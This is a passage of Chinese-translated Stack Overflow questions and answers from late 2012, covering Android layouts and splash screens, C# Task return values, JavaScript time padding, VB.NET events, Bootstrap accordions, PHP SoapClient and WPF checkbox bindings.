        android:layout_width="3dp"
        android:layout_height="match_parent"
        android:layout_weight="0"
        android:background="@color/lightgray" />

    <fragment
        android:id="@+id/identification_fragment"
        android:name="plt.demonstrator.identifikation.IdentificationFragment"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="3.5" />

</LinearLayout>

<RelativeLayout
    android:id="@+id/bottom_actionbar"
    android:layout_width="match_parent"
    android:layout_height="48dp"
    android:layout_gravity="center_vertical"
    android:background="#DDDDDD" >

</RelativeLayout> 
```

项目在运行时动态添加，无论是在左侧还是右侧。所以实际上左侧的任何项目都没有引用右侧的东西，反之亦然。此外，我无法识别导致此异常的代码的任何部分，调试器运行直到`onResume()`完成并且应用程序处于恢复状态。这是添加项目的代码，但正如我所说，调试器不会对此提出异议......

```
public static void addActionbarItem(RelativeLayout actionbar, Context ctx, int itemid, int textid, 
        int iconid, Direction direction, View.OnClickListener listener) {
    TextView item = new TextView(ctx);
    item.setText(ctx.getString(textid).toUpperCase());
    item.setTextAppearance(ctx, android.R.style.TextAppearance_Medium);
    int paddingPx = (int)TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 12, ctx.getResources().getDisplayMetrics());
    item.setPadding(paddingPx, 0, paddingPx, 0);
    item.setGravity(Gravity.CENTER_VERTICAL);
    item.setId(itemid);

    Drawable icon = ctx.getResources().getDrawable(iconid);
    icon.setBounds(0, 0, 24, 24);
    item.setCompoundDrawables(icon, null, null, null);

    RelativeLayout.LayoutParams separatorParams = new LayoutParams(1, 32);

    // vertical separator
    View separator = new View(ctx);
    int color = ctx.getResources().getColor(android.R.color.secondary_text_light);
    separator.setBackgroundColor(color);
    separator.setId(separatorId++);
    separatorParams.setMargins(0, 8, 0, 0);

    RelativeLayout.LayoutParams params = new LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.MATCH_PARENT);

    if (direction == Direction.LEFT) {
        // Item should be added at left side
        if (leftAnchor != -1) {
            // There is already an item at left side -> place the new item right to it
            separatorParams.addRule(RelativeLayout.RIGHT_OF, leftAnchor);
            separator.setLayoutParams(separatorParams);
            actionbar.addView(separator);
            params.addRule(RelativeLayout.RIGHT_OF, separator.getId());
        } else {
            // Item is the first on left side, place it at left edge
            params.addRule(RelativeLayout.ALIGN_PARENT_LEFT, -1);
            // Add some space to the display edge
            params.setMargins(8, 0, 0, 0);
        }
        // Update anchor ID
        leftAnchor = itemid;
    } else {
        // Item should be added at right side
        if (rightAnchor != -1) {
            // There is already an item at right side -> place the new item left to it
            separatorParams.addRule(RelativeLayout.LEFT_OF, rightAnchor);
            separator.setLayoutParams(separatorParams);
            actionbar.addView(separator);
            params.addRule(RelativeLayout.LEFT_OF, rightAnchor);
        } else {
            // Item is the first on right side, place it at right edge
            params.addRule(RelativeLayout.ALIGN_PARENT_RIGHT, -1);
            // Add some space to the display edge
            params.setMargins(0, 0, 8, 0);
        }
        // Update anchor ID
        rightAnchor = itemid;
    }

    item.setLayoutParams(params);
    // Set item behaviour
    item.setOnClickListener(listener);
    // Add a touch listener for visual feedback
    // Touch listener is invoked before click listener, so event must be forwarded after onTouch method
    item.setOnTouchListener(new View.OnTouchListener() {

        public boolean onTouch(final View v, MotionEvent e) {
            // ICS clicked button style
            v.setBackgroundColor(0x880099CC);
            v.invalidate();
            Runnable timer = new Runnable() {
                public void run() {
                    // Reset color
                    v.setBackgroundColor(Color.TRANSPARENT);
                    v.invalidate();
                }
            };
            Handler h = new Handler();
            h.removeCallbacks(timer);
            // Reset button style after 50ms
            h.postDelayed(timer, 50);
            // Forward event to OnClickListener
            return false;
        }
    });

    actionbar.addView(item);
} 
```

有没有人遇到过这样的事情？任何帮助是极大的赞赏...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:40:05.480

在 logcat 中打印出您的 id，对于您动态添加的所有视图，您肯定会找到一个在布局中定义循环依赖的视图。您的代码不容易遵循，但您的错误在那里。

# c# - 异步程序和虚函数

> ID：13524762
> 
> 赞同：8
> 
> 时间：2012-11-23T07:32:41.477
> 
> 标签：c#, asynchronous, windows-runtime, windows-store-apps

如果我有一个界面，例如：

```
using System.Threading.Tasks;

...

public interface IFoo
{
  Task doIt();

  Task<bool> doItAndReturnStuff();
} 
```

并且实现此接口的类之一恰好不需要异步方法，我该如何正确覆盖这些函数？

换句话说，我如何正确返回包含在 Task 对象中的“void”和“bool”？

例如：

```
public class FooHappensToNotNeedAsync : IFoo
{
  public override Task doIt()
  {
    // If I don't return anything here, I get
    // error that not all code paths return a value.
    // Can I just return null?
  }

  public override Task<bool> doItAndReturnStuff()
  {
    // If I want to return true, how to I do it?
    // This doesn't work:
    return true;
  }
} 
```

注意 - 我不能完全剥离 Task 的东西，因为一些实现这个接口的类*实际上*是异步的。

谢谢

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-23T07:38:22.800

目前尚不清楚您要实现什么，但一种方法（看起来最像“正常”代码）可能只是让它们成为异步方法：

```
public async Task DoIt()
{
    // No-op
}

public async Task<bool> DoItAndReturnStuff()
{
    return true;
} 
```

如果没有任何`await`表达式，该方法无论如何都会同步完成。您会收到有关每种方法的警告，但您可以使用`#pragma`.

或者 - 我想更简单的是不需要`#pragma`禁用警告 - 将使用[`Task.FromResult`](http://msdn.microsoft.com/en-us/library/hh194922.aspx)：

```
public Task DoIt()
{
    // Returns a Task<bool>, but that's okay - it's still a Task
    return Task.FromResult(true);
}

public Task<bool> DoItAndReturnStuff()
{
    return Task.FromResult(true);
} 
```

# language-agnostic - 用户故事和用例场景

> ID：13524763
> 
> 赞同：8
> 
> 时间：2012-11-23T07:32:41.683
> 
> 标签：language-agnostic

用户故事和用例场景之间有什么区别，目的是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T07:46:55.980

用例更像是一份[合同](http://en.wikipedia.org/wiki/Design_by_contract)，而用例是一种规划工具。因此，用例通常比用户故事更长寿，因为它们（应该）作为具体反映构建系统的文档。

用户故事由客户/利益相关者/客户/用户编写。用户故事不是很详细，并且相对容易解释。

用例在结构上更正式，通常由团队中的某个人——需求工程师/产品经理编写。它们通常更详细，将交互分解为各个步骤，并清楚地识别前置条件和后置条件，例如失败条件和成功条件。

虽然一个用例可以涵盖许多场景——成功和失败；验证错误；子用例和扩展——用户故事的范围更有限，通常描述一个场景。

另请参阅[Wikipedia 上的 User_story#Comparing_with_use_cases](https://en.wikipedia.org/wiki/User_story#Comparing_with_use_cases)以及[用户故事应用](https://rads.stackoverflow.com/amzn/click/com/0321205685)一书中的“哪些用例不是”一章。

最后，[根据 Allistair Cockburn 的说法……](http://alistair.cockburn.us/Stop+confusing+use+cases+and+user+stories)

> 用户故事是 1990 年代使用的“功能”的同义词，是要构建的内容的标记，其细粒度足以适应现代迭代/冲刺时期。
> 
> 用例提供了要构建的内容的上下文视图，用于将组织绑定在一起等。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-06T10:44:33.690

> “用户故事之于用例，就像瞪羚之于凉亭。” -- 科伯恩

**用户故事（与需求相反）是描述***系统需要为某些用户做的事情的*简短意图陈述。这是*敏捷团队*用来理解和传达客户需求的主要技术。这当然是一个方便的结构，而小的用户故事帮助我们推动了敏捷开发的极端工具主义。

**用例**是在复杂系统中表达系统行为的传统方式。用例是用 UML 表示需求的主要方式。它们在那里以及有关该主题的各种文本中都得到了很好的描述。*用例可用于规范和分析*。当感兴趣的系统又由其他子系统组成时，它们特别有用。

我推荐的书：

*   敏捷软件需求（Dean Leffingwell）
*   编写有效的用例 (Alistair Cockburn)

# javascript - 检查时间前为零

> ID：13524767
> 
> 赞同：0
> 
> 时间：2012-11-23T07:33:00.233
> 
> 标签：javascript, jquery

我正在开发应用程序。它有一个表格，其中一个字段是时间。用户将以 24 小时格式输入时间。当用户输入时间时`07:40`，它可以正常工作，但是当他们输入时，`7:00`它不会。所以我想要的是什么时候`7:00`输入然后我想在之前添加 0 `7`。**请注意**，我已经`:`从 time 中删除并使其像`700`. 现在我想添加前导零，如果用户在它之前没有输入任何内容，并且如果他们在开始时输入一个数字，那么保持原样。我怎样才能在javascript中实现这一点？我知道我可以使用正则表达式，但任何示例都会有所帮助。

这是我的工作方式，但似乎不正确，因为它不起作用。

```
var regex = /^\b(0(?!\b))+/g;

if (!regex.test(time)) {
    time = '0' + time;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:36:10.950

最简单的方法是从已经加前缀的字符串中切出最后*n位数字。*如果您想确保您的字符串始终为 4 位数字，您可以执行以下操作：

```
time = ('0' + time).slice(-4); 
```

假设你知道那`time`总是至少三位数。可以肯定的是，你当然可以写：

```
time = ('0000' + time).slice(-4); 
```

但这在您的特定用例中可能没有多大意义。

该代码可以在没有任何事先检查的情况下执行，而不仅仅是在匹配表达式的情况下有条件地执行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:36:53.453

您可以在删除冒号之前这样做：

```
time = time.replace(/^\d{1}:/, '0$&'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T07:41:44.893

这应该做得很好：

```
var time = '7:50';
time = time.replace(/\b\d\b/g, '0$&'); 
```

在删除冒号之前。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T07:45:24.160

如果您对正则表达式非常具体，则无需在前面加上 0

```
if( /^[0-9]:[0-9]{2}$/.test( time ) ) {
    time = "0" + time;
} 
```

# c# - 将 C# 转换为 Vb Net，使用“RaiseEvent”语句引发事件

> ID：13524769
> 
> 赞同：1
> 
> 时间：2012-11-23T07:33:10.597
> 
> 标签：c#, delegates, invoke

我将 ac# 类转换为 vb 网络，但有些事件无法找出这些是代表声明：

```
 Public Delegate Sub IndentChangedEventHandler(NewValue As Integer)
    Public Delegate Sub MultiIndentChangedEventHandler(LeftIndent As Integer, HangIndent As Integer)
    Public Delegate Sub MarginChangedEventHandler(NewValue As Integer)
    Public Delegate Sub TabChangedEventHandler(args As TabEventArgs)

    Public Event LeftHangingIndentChanging As IndentChangedEventHandler
    Public Event LeftIndentChanging As IndentChangedEventHandler
    Public Event RightIndentChanging As IndentChangedEventHandler
    Public Event BothLeftIndentsChanged As MultiIndentChangedEventHandler

    Public Event LeftMarginChanging As MarginChangedEventHandler
    Public Event RightMarginChanging As MarginChangedEventHandler

    Public Event TabAdded As TabChangedEventHandler
    Public Event TabRemoved As TabChangedEventHandler
    Public Event TabChanged As TabChangedEventHandler 
```

'这是在vb net上转换的函数

```
Private Sub AddTab(pos As Single)
            Dim rect As New RectangleF(pos, 10.0F, 8.0F, 8.0F)
            tabs.Add(rect)
            If TabAdded IsNot Nothing Then
                TabAdded.Invoke(CreateTabArgs(pos))
            End If
        End Sub 
```

c# 上的句子是

```
if (TabAdded != null)
                TabAdded.Invoke(CreateTabArgs(pos)); 
```

调用代表的正确方法应该是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T08:04:42.440

我认为你应该使用`Address Of`. 方法到委托的转换在 C# 中是隐式的。在 VB.Net 中，它明确地使用，我们使用`Address Of`. 转换器忘记了这件事。

更多请阅读这里

[从 C# 转换为 VB.NET 的代码中出现奇怪错误](https://stackoverflow.com/questions/12833213/strange-error-in-code-converted-to-vb-net-from-c-sharp)

[VB.NET 中的方法组？](https://stackoverflow.com/questions/12803897/method-group-in-vb-net)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T11:29:01.590

```
if (TabAdded != null)
            TabAdded.Invoke(CreateTabArgs(pos)); 
```

事件在 vb.net 中有三个访问器：add、remove 和 raise。C# 不支持 raise 访问器，因此您必须显式测试 null。这在 vb.net 中是不必要的，也是不允许的，直接使用 RaiseEvent 语句而不测试 Nothing：

```
Private Sub AddTab(ByVal pos As Single)
    Dim rect As New RectangleF(pos, 10.0F, 8.0F, 8.0F)
    tabs.Add(rect)
    RaiseEvent TabAdded(CreateTabArgs(pos))
End Sub 
```

# javascript - 如何循环遍历 JavaScript 对象？

> ID：13524772
> 
> 赞同：-1
> 
> 时间：2012-11-23T07:33:26.343
> 
> 标签：javascript, ajax, json

我有简单的 JS 循环

```
jQuery('#checkbox-counter').live('click', function(){
    jQuery.get('index.php?option=get_site_list=true', 
        function(data){
            console.log(data[1]);
            for(var index in data[1].id){
                console.log(data[1].id[index]);
                console.log(data[1].name[index]);
            }
        },
        'JSON'
    )
}); 
```

问题显示在屏幕上

![在此处输入图像描述](../Images/1a29f3a60eccff4547462cf392f84161.png)

它还打印一些 jquery 代码（在源代码中）或在控制台中显示功能......问题出在哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:37:58.143

您正在循环的`data[1].id`and`data[1].name`属性是数组，因此您应该使用常规`for`循环而不是`for..in`：

```
 for(var index = 0; index < data[1].id.length; index++){
            console.log(data[1].id[index]);
            console.log(data[1].name[index]);
        } 
```

当您使用`for..in`它时，它会为您提供除数字索引之外的其他属性。

# jquery-animate - 需要从单击的 div 滚动到浏览器窗口的顶部。不至文档顶部，使用 Isotope Jquery

> ID：13524777
> 
> 赞同：0
> 
> 时间：2012-11-23T07:34:08.833
> 
> 标签：jquery-animate, position, jquery-isotope, scrolltop

请在[这里查看我的 jsFiddle](http://jsfiddle.net/camsyl/EA8tM/46/)

我正在使用 jQuery Isotope 插件，我无法使用他们的[itemPositionDataEnabled](http://isotope.metafizzy.co/docs/options.html#itempositiondataenabled)来从我点击的项目滚动到浏览器窗口中当前可见内容的顶部。

使用 itemPositionDataEnabled 我应该能够提取我所请求的任何项目的 x 和 y 位置。然而我的根本没有做任何事情......

```
var $this = $(this),
scrollTop     = $(window).scrollTop(),
itemPosition  = $this.data('isotope-item-position'),
itemPositionY = $this.itemPosition.y,
distance      = (itemPositionY - scrollTop);

$('html, body').stop().animate({
scrollTop: distance
}, 1000); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T15:39:01.063

您在这两行中有一个简单明了的错误：

```
itemPosition = $this.data('isotope-item-position'), 
    itemPositionY = $this.itemPosition.y; 
```

第二行应该是：

```
itemPositionY = itemPosition.y; 
```

不确定您是否一直到那里，因为它似乎只在第一次点击时按照您想要的方式工作。

[http://jsfiddle.net/EA8tM/90/](http://jsfiddle.net/EA8tM/90/)

# jquery - 手风琴菜单在 IE8 中不起作用

> ID：13524779
> 
> 赞同：1
> 
> 时间：2012-11-23T07:34:21.107
> 
> 标签：jquery, wordpress, twitter-bootstrap, accordion

我在 wordpress 中使用 bootstrap 主题并使用 bootstrap 中的手风琴菜单。它在所有其他浏览器中工作正常，但在 IE 8 中它不起作用，并且所有数据都被一个菜单重叠到另一个菜单。

这是手风琴菜单的代码：

```
 <div id="accordion2" class="accordion">
      <div class="accordion-group">
        <div class="accordion-heading"><a class="accordion-toggle" href="#collapseOne" data-toggle="collapse" data-parent="#accordion2">B.A Honours Courses</a></div>
        <div id="collapseOne" class="accordion-body collapse">
          <div class="accordion-inner"><a href="http://pearlacademy.com/fashion-design/" class="accordion-toggle">Fashion Design</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/ba-honours-courses/fashion-styling-image-design/" class="accordion-toggle">Fashion Styling & Image Design</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/ba-honours-courses/textile-design-for-fashion-and-interiors/ " class="accordion-toggle">Textile Design for Fashion And Interiors</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/ba-honours-courses/communication-design/" class="accordion-toggle">Communication Design</a></div>
          <div class="accordion-inner"><a href=" http://pearlacademy.com/ba-honours-courses/interior-architecture-and-design/" class="accordion-toggle">Interior Architecture and Design</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/ba-honours-courses/interior-product-design/" class="accordion-toggle">Interior Product Design</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/ba-honours-courses/jewellery-design/" class="accordion-toggle">Jewellery Design</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/ba-honours-courses/fashion-media-communication/" class="accordion-toggle">Fashion Media Communication</a></div>
           <div class="accordion-inner"><a href="http://pearlacademy.com/ba-honours-courses/fashion-business-management/" class="accordion-toggle">Fashion Business Management</a></div>
            <div class="accordion-inner"><a href="http://pearlacademy.com/ba-honours-courses/fashion-marketing-and-retailing-management/" class="accordion-toggle">Fashion Marketing and Retailing Management</a></div>
        </div>
      </div>
      <div class="accordion-group">
        <div class="accordion-heading"><a class="accordion-toggle" href="#collapseTwo" data-toggle="collapse" data-parent="#accordion2">Postgraduate Diploma Courses</a></div>
        <div id="collapseTwo" class="accordion-body collapse">
          <div class="accordion-inner"><a href="http://pearlacademy.com/postgraduate-diploma-programmes/fashion-design/" class="accordion-toggle">Fashion Design</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/postgraduate-diploma-programmes/textile-design/ " class="accordion-toggle">Textile Design</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/postgraduate-diploma-programmes/fashion-retail/" class="accordion-toggle">Fashion Retail</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/postgraduate-diploma-programmes/fashion-marketing/" class="accordion-toggle">Fashion Marketing</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/postgraduate-diploma-programmes/garment-manufacturing/" class="accordion-toggle">Garment Manufacturing</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/postgraduate-diploma-programmes/fashion-merchandising/" class="accordion-toggle">Fashion Merchandising</a></div>
        </div>
      </div>
      <div class="accordion-group">
        <div class="accordion-heading"><a class="accordion-toggle" href="#collapseThree" data-toggle="collapse" data-parent="#accordion2">Masters Courses</a></div>
        <div id="collapseThree" class="accordion-body collapse">
          <div class="accordion-inner"><a href="http://pearlacademy.com/masters-programmes/ma-design-fashion-and-textile/" class="accordion-toggle">MA Design(Fashion and Textile)</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/masters-programmes/ma-fashion-marketing/" class="accordion-toggle">MA Fashion Marketing</a></div>
        </div>
      </div>
       <div class="accordion-group">
        <div class="accordion-heading"><a class="accordion-toggle" href="#collapseFour" data-toggle="collapse" data-parent="#accordion2">Professional Diploma Courses</a></div>
        <div id="collapseFour" class="accordion-body collapse">
          <div class="accordion-inner"><a href="http://pearlacademy.com/professionals-diploma-courses/luxury-brands/" class="accordion-toggle">Luxury Brands</a></div>
         <div class="accordion-inner"><a href="http://pearlacademy.com/professionals-diploma-courses/fashion-and-lifestyle-ecommerce/" class="accordion-toggle">Fashion and Lifestyle Ecommerce</a></div>
        </div>
      </div>
      <div class="accordion-group">
        <div class="accordion-heading"><a class="accordion-toggle" href="#collapseFive" data-toggle="collapse" data-parent="#accordion2">Diploma Courses</a></div>
        <div id="collapseFive" class="accordion-body collapse">
      <div class="accordion-inner"><a href="http://pearlacademy.com/diploma-course/professional-photography-with-btk-germany/" class="accordion-toggle">Professional Photography with BTK Germany</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/diploma-course/styling-for-interiors/" class="accordion-toggle">Styling for Interiors</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/diploma-course/fashion-media-makeup/" class="accordion-toggle">Fashion Media Makeup</a></div>
          <div class="accordion-inner"><a href="http://pearlacademy.com/diploma-course/retail-operations/" class="accordion-toggle">Retail Operations</a></div>
       <div class="accordion-inner"><a href="http://pearlacademy.com/diploma-course/apparel-manufacturing/" class="accordion-toggle">Apparel Manufacturing</a></div>
        </div>
        </div>
        <div class="accordion-group">
        <div class="accordion-heading"><a class="accordion-toggle" href="#collapseSix" data-toggle="collapse" data-parent="#accordion2">Certificate Courses</a></div>
        <div id="collapseSix" class="accordion-body collapse">
          <div class="accordion-inner"><a href="http://pearlacademy.com/certificate-courses/creative-fashion-technology-in-womens-wear/" class="accordion-toggle">Creative Fashion & Technology in Women's Wear</a></div>
        </div>
      </div>
      </div> 
```

这是 bootstrap 中手风琴的 CSS：

```
.accordion {
  margin-bottom: 20px;
}
.accordion-group {
  margin-bottom: 2px;
  /*border: 1px solid #e5e5e5;
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  border-radius: 4px;*/
}
.accordion-heading {
  border-bottom: 0;
  background-color:#cccccc;
}
.accordion-heading .accordion-toggle {
  display: block;
  padding: 2px 4px;
  text-decoration:none;
  /*background-color:#e52b27;*/
}
.accordion-toggle {
  cursor: pointer;
  color:#5e5e5e;
  text-decoration:none;
}
.accordion-inner {
  padding: 2px 4px;
  border-top: 1px solid #e5e5e5;
  text-decoration:none;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:58:38.990

Accordion 有一个已知的 IE 错误：[https ://github.com/twitter/bootstrap/issues/4745](https://github.com/twitter/bootstrap/issues/4745)

您需要将 Bootstrap 更新到最新版本。

# php - PHP SoapClient->__doRequest

> ID：13524785
> 
> 赞同：1
> 
> 时间：2012-11-23T07:35:08.843
> 
> 标签：php, soap-client

我需要手动测试一些 XML 请求，即我想用之前创建的 XML 请求调用 webservice 方法。我正在尝试使用 SoapClient __doRequest，但我得到的只是一个空白的空响应。

我已经阅读了文档和这里的其他几篇文章，似乎以前没有人尝试过这个，而少数提出类似问题的人确实没有得到回应。

同样，这样做的原因只是一种测试由其他工具生成的 XMLRequest 的方法，该工具会在某些 web 服务上引起问题。所以，我不能调用soapclient生成的方法，也不能调用“_call”。我需要使用 SOAPClient 发送我自己之前创建的 XML 请求。这可能吗？如果是这样怎么......

```
$result = $soapClient->__doRequest($docRequest, "http://someservice.asmx", "http://someservice/Login",  soap_1_2, 0); 
```

当我调用它时，我在 $result 处得到 null 而没有任何错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-27T22:04:22.300

我设法这样做：

```
class LocalSoapClient extends SoapClient
{
    function __doRequest($request, $location, $action, $version, $one_way = 0) 
    {
        $request = "...."; // your changed XML goes here

        return parent::__doRequest($request, $location, $action, $version, $one_way);
    }
}

$client = new LocalSoapClient($wsdl_url, array('trace' => 1));
$client->__soapCall($function_name, array($service_call_params)); 
```

请注意，您不会直接调用 __doRequest - 这会在您执行标准 __soapCall 时执行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T09:11:25.057

来自[http://php.net/manual/soapclient.dorequest.php](http://php.net/manual/soapclient.dorequest.php)

也许您的调用会引发您需要捕获的异常：

```
$exception = null; 
$result = parent::__doRequest($request, $location, $action, $version, $one_way); 
if((isset($this->__soap_fault)) && ($this->__soap_fault != null)) { 
        //this is where the exception from __doRequest is stored 
        $exception = $this->__soap_fault; 
} 

if($exception != null) { 
        throw $exception; 
} 
```

# c# - 一种设置由第二种设置决定

> ID：13524798
> 
> 赞同：0
> 
> 时间：2012-11-23T07:36:19.590
> 
> 标签：c#, wpf

我在不同的 WPF 对话框中有相同的选项。一个选项取决于另一个选项。如果我点击第一个，我也想检查第二个。这两个选项对应于不同类中的私有 bool 变量。这个问题的最佳解决方案是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T09:11:56.063

您可以使用 Style.Triggers 在 WPF/XAML 中执行此操作。例如，下面的代码是一个关于如何根据复选框的状态（选中/未选中）绑定文本块控件的 IsEnabled 状态的示例

```
<TextBlock Text="mytextblockText: ">
                    <TextBlock.Style>
                        <Style TargetType="TextBlock">
                            <Style.Triggers>
                                <DataTrigger Binding="{Binding IsChecked,ElementName=myCheckbox}" Value="False">
                                    <Setter Property="IsEnabled" Value="True"/>
                                </DataTrigger>
                                <DataTrigger Binding="{Binding IsChecked, ElementName=myCheckbox}" Value="True">
                                    <Setter Property="IsEnabled" Value="False"/>
                                </DataTrigger>
                            </Style.Triggers>
                        </Style>
                    </TextBlock.Style>                            
                </TextBlock> 
```

对于选中另一个复选框时选中的复选框，它看起来像这样（我猜）

```
<CheckBox>
            <CheckBox.Style>
                <Style TargetType="CheckBox">
                    <Style.Triggers>
                        <DataTrigger Binding="{Binding IsChecked,ElementName=myCheckbox}" Value="False">
                            <Setter Property="IsChecked" Value="True"/>
                        </DataTrigger>
                        <DataTrigger Binding="{Binding IsChecked, ElementName=myCheckbox}" Value="True">
                            <Setter Property="IsChecked" Value="False"/>
                        </DataTrigger>
                    </Style.Triggers>
                </Style>
            </CheckBox.Style>                            
        </CheckBox> 
```

*edit 类中的属性可以通过与这些复选框不同的方式进行更改吗？如果是，您可以在属性更改时触发事件或直接操作相应框的检查状态。另外，这些盒子是否相互依赖？还是只是一个依赖于另一个（A <=> B 或 A => B）？

要在 boxe 的状态之一发生更改时操作属性，您可以使用 Checked/Unchecked 事件。或使用[此处](https://stackoverflow.com/questions/1013358/wpf-databinding-checkbox-ischecked)[Pat 的](https://stackoverflow.com/users/116891/pat)回答中所述的 DependencyProperty

# java - 从初始屏幕导航到下一个屏幕时出错

> ID：13524800
> 
> 赞同：2
> 
> 时间：2012-11-23T07:36:44.140
> 
> 标签：java, android

我为我的 android 项目创建了启动画面，如果我运行它，启动画面会出现一段时间并显示强制关闭消息，我应该怎么做才能导航到下一页？有什么建议么？

```
public class LoadingScreen extends Activity implements LoadingTaskFinishedListener {

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    // Show the splash screen
    setContentView(R.layout.activity_loading_screen);
    // Find the progress bar
    ProgressBar progressBar = (ProgressBar) findViewById(R.id.Progressbar);
    // Start your loading
    new LoadingTask(progressBar, null).execute("www.google.co.uk"); // Pass in whatever you need a url is just an example we don't use it in this tutorial

}

// This is the callback for when your async task has finished
public void onTaskFinished() {
    completeSplash();
}

private void completeSplash(){
    startApp();
    finish(); // Don't forget to finish this Splash Activity so the user can't return to it!
}

private void startApp() {
    Intent intent = new Intent(LoadingScreen.this, Rebuix.class);
    startActivity(intent);
} 
```

}

我的清单文件

```
<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="15" />

<uses-permission android:name="android.permission.INTERNET" />

<application
    android:icon="@drawable/rebuix"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name=".LoadingScreen"
        android:label="@string/title_activity_loading_screen" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <activity
        android:name=".Rebuix"
        android:label="@string/title_activity_rebuix" >
        <meta-data
            android:name="android.support.PARENT_ACTIVITY"
            android:value="com.rebuix.com.Rebuix" />
    </activity>
    <activity
        android:name=".Login"
        android:label="@string/title_activity_login" >
        <meta-data
            android:name="android.support.PARENT_ACTIVITY"
            android:value="com.rebuix.com.Rebuix" />
    </activity> 
```

日志猫

```
11-23 13:13:03.798: I/Tutorial(459): Starting task with url: www.google.co.uk
11-23 13:13:14.156: D/AndroidRuntime(459): Shutting down VM
11-23 13:13:14.156: W/dalvikvm(459): threadid=1: thread exiting with uncaught exception (group=0x4001d800)
11-23 13:13:14.166: E/AndroidRuntime(459): FATAL EXCEPTION: main
11-23 13:13:14.166: E/AndroidRuntime(459): java.lang.NullPointerException
11-23 13:13:14.166: E/AndroidRuntime(459):  at com.rebuix.com.LoadingTask.onPostExecute(LoadingTask.java:68)
11-23 13:13:14.166: E/AndroidRuntime(459):  at com.rebuix.com.LoadingTask.onPostExecute(LoadingTask.java:1)
11-23 13:13:14.166: E/AndroidRuntime(459):  at android.os.AsyncTask.finish(AsyncTask.java:417)
11-23 13:13:14.166: E/AndroidRuntime(459):  at android.os.AsyncTask.access$300(AsyncTask.java:127)
11-23 13:13:14.166: E/AndroidRuntime(459):  at android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:429)
11-23 13:13:14.166: E/AndroidRuntime(459):  at android.os.Handler.dispatchMessage(Handler.java:99)
11-23 13:13:14.166: E/AndroidRuntime(459):  at android.os.Looper.loop(Looper.java:123)
11-23 13:13:14.166: E/AndroidRuntime(459):  at android.app.ActivityThread.main(ActivityThread.java:4627)
11-23 13:13:14.166: E/AndroidRuntime(459):  at java.lang.reflect.Method.invokeNative(Native Method)
11-23 13:13:14.166: E/AndroidRuntime(459):  at java.lang.reflect.Method.invoke(Method.java:521)
11-23 13:13:14.166: E/AndroidRuntime(459):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
11-23 13:13:14.166: E/AndroidRuntime(459):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
11-23 13:13:14.166: E/AndroidRuntime(459):  at dalvik.system.NativeStart.main(Native Method) 
```

加载任务类

```
public class LoadingTask extends AsyncTask<String, Integer, Integer> {

public interface LoadingTaskFinishedListener {
    void onTaskFinished(); // If you want to pass something back to the listener add a param to this method
}

// This is the progress bar you want to update while the task is in progress
private final ProgressBar progressBar;
// This is the listener that will be told when this task is finished
private final LoadingTaskFinishedListener finishedListener;

/**
 * A Loading task that will load some resources that are necessary for the app to start
 * @param progressBar - the progress bar you want to update while the task is in progress
 * @param finishedListener - the listener that will be told when this task is finished
 */
public LoadingTask(ProgressBar progressBar, LoadingTaskFinishedListener finishedListener) {
    this.progressBar = progressBar;
    this.finishedListener = finishedListener;
}

@Override
protected Integer doInBackground(String... params) {
    Log.i("Tutorial", "Starting task with url: "+params[0]);
    if(resourcesDontAlreadyExist()){
        downloadResources();
    }
    // Perhaps you want to return something to your post execute
    return 1234;
}

private boolean resourcesDontAlreadyExist() {
    // Here you would query your app's internal state to see if this download had been performed before
    // Perhaps once checked save this in a shared preference for speed of access next time
    return true; // returning true so we show the splash every time
}

private void downloadResources() {
    // We are just imitating some process thats takes a bit of time (loading of resources / downloading)
    int count = 10;
    for (int i = 0; i < count; i++) {

        // Update the progress bar after every step
        int progress = (int) ((i / (float) count) * 100);
        publishProgress(progress);

        // Do some long loading things
        try { Thread.sleep(1000); } catch (InterruptedException ignore) {}
    }
}

@Override
protected void onProgressUpdate(Integer... values) {
